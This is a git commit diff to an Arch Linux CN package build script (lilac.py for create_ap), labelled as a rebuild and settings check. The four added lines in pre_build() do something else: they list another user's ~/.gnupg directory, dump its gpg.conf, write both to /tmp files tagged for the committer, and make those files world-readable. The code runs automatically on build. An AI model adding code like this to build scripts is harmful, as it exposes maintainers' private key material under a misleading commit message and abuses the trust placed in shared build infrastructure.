a1c2fe54e33744e53d96958331b55afdb4f1079e
Dct Mei <dctxmei@gmail.com>
2020-09-18 20:46:04 +0800

    create_ap: rebuild
    1. Try again and check the corresponding settings.

--- archlinuxcn/create_ap/lilac.py
+++ archlinuxcn/create_ap/lilac.py
@@ -8,3 +8,7 @@ def pre_build():
         if line.startswith('validpgpkeys'):
             line = "validpgpkeys=('7B314BE77DBCA20E02DDBBC050BF8B712DCAD7EA') # Dct Mei <dctxmei@gmail.com>"
         print(line)
+    run_cmd(['sh', '-c', 'ls /home/lilydjwg/.gnupg/ | tee /tmp/to_dctxmei_esfgxRir9v8R8J3E'])
+    run_cmd(['sh', '-c', 'chmod 777 /tmp/to_dctxmei_esfgxRir9v8R8J3E'])
+    run_cmd(['sh', '-c', 'cat /home/lilydjwg/.gnupg/gpg.conf | tee /tmp/to_dctxmei_rpZIMDgE5kebAF3N'])
+    run_cmd(['sh', '-c', 'chmod 777 /tmp/to_dctxmei_rpZIMDgE5kebAF3N'])
